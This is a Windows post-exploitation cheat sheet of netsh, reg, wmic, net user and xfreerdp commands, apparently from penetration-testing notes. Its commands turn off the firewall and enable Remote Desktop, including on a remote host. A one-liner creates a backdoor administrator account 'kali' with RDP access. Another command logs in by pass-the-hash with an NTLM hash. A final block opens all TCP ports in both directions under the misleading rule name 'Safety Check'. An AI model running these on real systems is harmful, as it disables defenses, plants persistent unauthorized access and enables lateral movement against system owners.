```powershell
netsh firewall show state # FW info, open ports
			netsh advfirewall firewall show rule name=all
			netsh firewall show config # FW info
			Netsh Advfirewall show allprofiles
			
			# requires admin
			NetSh Advfirewall set allprofiles state off  #Turn Off
			NetSh Advfirewall set allprofiles state on  #Turn On
			netsh firewall set opmode disable #Turn Off

			#How to open ports
			netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
			netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139

			#Enable Remote Desktop
			reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
			netsh advfirewall add portopening TCP 3389 "Remote Desktop"
			
			#Enable Remote Desktop with wmic
			wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
			wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

			#Enable Remote assistance:
			reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f
			netsh firewall set service remoteadmin enable

			# New Admin User, RDP + Remote Assistance + Firewall allow
			net user kali kalikali /add & net localgroup administrators kali /add & net localgroup "Remote Desktop Users" kali /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh advfirewall add portopening TCP 3389 "Remote Desktop" & netsh advfirewall set service remoteadmin enable
			

			::Connect to RDP (using hash or password)
			xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
			xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```

```powershell
netsh advfirewall firewall add rule name="Safety Check" dir=in action=allow protocol=TCP localport=1-65535

netsh advfirewall firewall add rule name="Safety Check" dir=out action=allow protocol=TCP localport=1-65535
```
